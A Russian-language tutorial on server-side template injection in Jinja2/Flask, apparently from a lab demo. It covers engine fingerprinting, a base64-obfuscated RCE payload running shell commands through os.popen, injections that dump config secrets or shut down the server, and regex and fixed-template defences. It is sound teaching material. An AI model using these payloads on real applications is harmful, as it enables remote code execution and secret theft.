# SSTI  
## Описание
Серверные шаблонизаторы используются для того, чтобы отделить HTML-код (представление данных) от кода языка и сделать HTML-код динамическим. Шаблон – это файл, содержащий HTML и некоторые маркеры кода, позволяющий этот шаблон обработать и сформировать на его основе конечный HTML-код.

Пример такого маркера в Jinaj2: `{{information}}`. Где `information` - какая-либо переменная, которая будет передана в шаблонизатор, и значение которой будет использоваться при рендере шаблона.

 Шаблонизаторы функционируют в серверной среде. В результате, разрешение недоверенным пользователям редактировать  
 шаблоны (именно шаблоны, а не значения шаблонов) создает ряд серьезных рисков, которые могут не быть очевидны в документации системы шаблонов.     
 Многие современные технологии, разработанные для предотвращения вреда шаблонами, в настоящее время являются недоработанными   
 и на них не следует полагаться, кроме как в качестве превентивной меры защиты.   
  
## Классификация
Популярные уязвимые:
* smarty
* mako
* jinja2
* twig
* и т.д.  

Помимо этого, есть и шаблонизаторы, которые не несут серьезных рисков при инъекции в них:
* [Mustache](https://mustache.github.io/)
* [Python's Template](https://docs.python.org/3/library/string.html#template-strings)

  
## Условия
- ОС: любая
- язык: любой
- компоненты: шаблонизатор
- настройки: любые
  
## Детектирование
Обнаружение происходит вводом возможных значений шаблонов в пользовательский ввод. Для детектирования мы проверяем ответ от сервера на введенные данные.

Идентификация:  
Выяснить, какой шаблонизатор используется. Сделать это очень просто, так как есть готовая схема для этой цели. Этот процесс выглядит так:  
![](https://defcon.ru/wp-content/uploads/2016/11/1.png)  
Нам необходимо подставлять конкретные выражения и следить за ответом сервера. В некоторых случаях одно выражаение может приводить к разным ответам сервера (в зависимости от того, какой шаблонизатор используется). Например инъекция `{{7*'7'}}`:
* вернёт `49`, если используется `Twig`
* вернет `7777777`, если используется `Jinja2`
* вернет тот же ввод, если нет инъекции или шаблонизатор не используется
  
#### 1 шаг
![1](https://pp.userapi.com/c846121/v846121517/18bd00/2Po0PiSSPa8.jpg)  
#### 2 шаг 
![2](https://pp.userapi.com/c846121/v846121517/18bd07/pR0f_0JxmBs.jpg)  
#### 3 шаг
![3](https://pp.userapi.com/c846121/v846121517/18bd0e/KZD9VkHvts8.jpg)  
  
Конечный вывод: `7777777`. Мы имеем дело с `Jinja2`.

## Эксплуатация
После того, как мы выяснили какой шаблонизатор используется, следующий наш шаг — чтение документации. Вот ключевые области на которые стоит обратить внимание:
* раздел «For Template Authors» описывает базовый синтаксис
* «Security Considerations» — раз мы получили инъекцию в шаблон, то скорее всего разработчики не читали данный раздел
* список встроеных функций, методов, переменных
* список дополнений/расширений — некоторый из них могут быть включены по умолчанию

В том случае, если в документации не будет говориться о встроенных переменных, то нам придётся их брутить. Сделать это можно через `Burp Intruder`. Нужные словари есть в [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection/Intruder)

### Ручная эксплуатация
Попробуем вызвать основные шаблоны. 
  
![self](https://pp.userapi.com/c846121/v846121517/18bcf9/B2iSScgkCMQ.jpg)  

Посмотрим конфигурацию сервера:  
  
![config](https://pp.userapi.com/c849132/v849132517/112edb/szvDnHpBZw4.jpg)

Узнаем скрытый в программном коде секрет:   
  
![secret](https://pp.userapi.com/c849132/v849132517/112eed/sPWNeku-cVI.jpg)

#### Выполнение любых команд на сервере
Проверим выполнение последовательности команд, закодировав их в `base64` и `urlencode`.

Полностью запрос выглядит так:
  
  ```python
%7B%7B6795544878%7D%7D%7B%7B%27%27%7D%7D%7B%25+set+d+%3D+%22eval%28__import__%28%27base64%27%29.urlsafe_b64decode%28%27X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnYVdRN2JITTdaV05vYnlBaWFXMGdhMjV2WTJ0cFpTd2dhVzBnZDJsdWJtVnlJU0lnUGo0Z2FHRmphMlZrTG5SNGREc2dZMkYwSUdoaFkydGxaQzUwZUhRPScpLmRlY29kZSgpKS5yZWFkKCk%3D%3D%27%29%29%22+%25%7D%7B%25+for+c+in+%5B%5D.__class__.__base__.__subclasses__%28%29+%25%7D+%7B%25+if+c.__name__+%3D%3D+%27catch_warnings%27+%25%7D%0A%7B%25+for+b+in+c.__init__.__globals__.values%28%29+%25%7D+%7B%25+if+b.__class__+%3D%3D+%7B%7D.__class__+%25%7D%0A%7B%25+if+%27eval%27+in+b.keys%28%29+%25%7D%0A%7B%7B+b%5B%27eval%27%5D%28d%29+%7D%7D%0A%7B%25+endif+%25%7D+%7B%25+endif+%25%7D+%7B%25+endfor+%25%7D%0A%7B%25+endif+%25%7D+%7B%25+endfor+%25%7D%7B%7B%27%27%7D%7D%7B%7B3601511735%7D%7D
 ```
 
 После URL декодирования:

```python
{{6795544878}}{{''}}{% set d = "eval(__import__('base64').urlsafe_b64decode('X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnYVdRN2JITTdaV05vYnlBaWFXMGdhMjV2WTJ0cFpTd2dhVzBnZDJsdWJtVnlJU0lnUGo0Z2FHRmphMlZrTG5SNGREc2dZMkYwSUdoaFkydGxaQzUwZUhRPScpLmRlY29kZSgpKS5yZWFkKCk='))" %}{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %}
{% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %}
{% if 'eval' in b.keys() %}
{{ b['eval'](d) }}
{% endif %} {% endif %} {% endfor %}
{% endif %} {% endfor %}{{''}}{{3601511735}}
```

Декодируем информацию из `base64`:
```python
__import__('os').popen(__import__('base64').urlsafe_b64decode('aWQ7bHM7ZWNobyAiaW0ga25vY2tpZSwgaW0gd2lubmVyISIgPj4gaGFja2VkLnR4dDsgY2F0IGhhY2tlZC50eHQ=').decode()).read()
```

Декодируем еще раз из `base64`:
```bash
id;ls;echo "im knockie, im winner!" >> hacked.txt; cat hacked.txt
```

Результат выполнения запроса:
![cmd](https://pp.userapi.com/c849132/v849132517/112efd/tuUyVE4ZbU0.jpg)

Однако, данные действия возможно автоматизировать, используя консольную утилиту [tplmap](https://github.com/epinna/tplmap):
![tpl](https://pp.userapi.com/c849132/v849132517/112f27/l7Ak41yusFs.jpg)  

С помощью данной утилиты также возможно выполнять команды как будто в шелле в реальном времени: 
![tpl2](https://pp.userapi.com/c849132/v849132517/112f47/7Pm6007VLf8.jpg)

### Инструменты
* [Tplmap.](https://github.com/epinna/tplmap)
  
## Ущерб
1) Анализ объекта `request`, который является глобальным в фрейворке Flask (`flask.request`). Данный объект содержит ту же самую информацию, что и объект `request`, доступный через представление. Внутри объекта `request` находится объект `environ`. Объект `request.environ` представляет собой словарь объектов, имеющих отношение к серверной части. Один из элементов этого словаря – метод `shutdown_server`, который связан с ключом `werkzeug.server.shutdown`. В шаблон можно инжектировать выражение `{{ request.environ['werkzeug.server.shutdown']() }}` и спровоцировать DOS-атаку. Однако этот метод не доступен, если приложение запущено при помощи HTTP-сервера gunicorn. Так что уязвимость может присутствовать лишь на сервере, который используется в целях разработки.

2) Анализ объекта `config`, который, так же как и объект `request`, является глобальным в фреймворке Flask (`flask.config`). Данный объект представляет собой словарь со всеми переменными, связанными с конфигурацией приложения, в том числе строками для подключения к базе данных, учетными записями к сторонним сервисам, SECRET_KEY и т. д. Просмотр этих переменных осуществляется при помощи выражения `{{ config.items() }}` и не сложнее, чем инжектирование полезной нагрузки. Не спасает и хранение этих данных в переменных среды окружения, поскольку объект config содержит все переменные, связанные с конфигурацией, ПОСЛЕ обработки фреймворком. Помимо того что `config` представляет собой словарь, этот объект также является подклассом, содержащим несколько методов: `from_envvar`, `from_object`, `from_pyfile` и `root_path`.

 3) Возможны:
- RCE (удаленное выполнение кода)
- чтение информации с файловой системы
- XSS (cross-site scripting)
  
## Защита   
### Основные меры

* Для снижения ущерба от реализации SSTI можно использовать простые шаблонизаторы, такие как `Mustache` или `Python's Template`. Они простые и в них не существует возможности получить удаленное выполнение кода или чтение информации с файловой системы
* При использовании шаблонизаторов необходимо ознакомиться с рекуомендациями по безопасности и использовать примеры защищенного кода


#### Вариант 1. Регулярные выражения
Для данного метода считается, что имя может состоять только из букв латинского алфавита. Изменяем исходный код таким образом, чтобы игнорировать ненужные символы.  
Исходный код:
```python
@app.route("/safe")
def safe_ssti():
        person = {'name': request.args.get('whoami')}

        if person['name'] is None:
                 person['name'] = 'world!'
        body = 'True name: %s' % re.sub('[^A-Za-z]', '', person['name'])
        return body
```
Проверка работоспособности:  
  
![fil](https://pp.userapi.com/c849132/v849132289/1166a4/T8wirzD24kA.jpg)  
  
Проверка работоспособности через tplmap:  
  
![tplm](https://pp.userapi.com/c849132/v849132289/1166c6/oNOZ7f7LDN8.jpg)  
  
Но это не лучшая защита от проблемы. Потому что:
* всегда есть вероятность обхода фильтра
* возможно разработчику необходимо принимать символы помимо букв латинского алфавита

#### Вариант 2. Строка шаблона 
```python
@app.route("/truesafe")
def truesafe_ssti():

        person = {'name': request.args.get('whoami'), 'secret': 'You win, master jedi!'}

        if person['name'] is None:
                person['name'] = 'world!'

        body = "Name:  {{person['name']}}"

        return render_template_string(body, person=person)
```
В данном варианте переменная `body` (шаблон) становится неизменяеемым для пользователя. Пользователь может только контроллировать знгачение, которое передается в шаблон, а не сам шаблон.

Проверка работоспособности:
  
![true](https://pp.userapi.com/c845417/v845417354/18ffc9/nNppoB7fhC4.jpg)
  
Проверка работоспособности через tplmap:
  
![tplm2](https://pp.userapi.com/c845417/v845417354/18ffea/We5WV4lbfM4.jpg)
  
## Внешний вид

#### Разработанные модули и графические средства с целью улучшения внешнего вида и удобства:
* статичный дизайн — да
* анимация — да
* перечень возможностей приложения(безопасный и небезопасный методы)

Используемое решение по созданию дизайна сайта:
#### Стартовая страница:
* иллюстрирует направления деятельности (или конкретные работы) приложения
* имеет структуру, собранную из 3 информационных блока: баннеры перехода на форму(2 безопасных и небезопасную). Все блоки одного размера. В будущем возможно расширение и обновление сайта путем замены одного блока на другие.

Файл `index.html`
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" href="static/favicon.ico" type="image/x-icon">
    <meta charset="UTF-8">
    <title>SSTI</title>
</head>
  <style>
   h1 {
    font-family: Impact, Charcoal, sans-serif;
    font-size: 500%;
   }
   p {
    font-family: Segoe Script;
    font-size: 250%;
   }
  </style>
<body bgcolor="#fff" background="{{ url_for('static',filename="back.jpg")}}"">
<div style="position:absolute; top:10%; left:43%">
<center><h1>SSTI</h1>
<p>Unsafe: <a href="unsafe?whoami=Ronnie">link</a></p>
<p>Safe: <a href="safe?whoami=Ronnie">link</a></p>
<p>True safe: <a href="truesafe?whoami=Ronnie">link</a></p>
<img src="static/1.gif" alt=""></div></center>
</body>
</html>
```
Стартовая страница: 
![start](https://pp.userapi.com/c845417/v845417354/19002f/h_5HR4vvBUk.jpg)
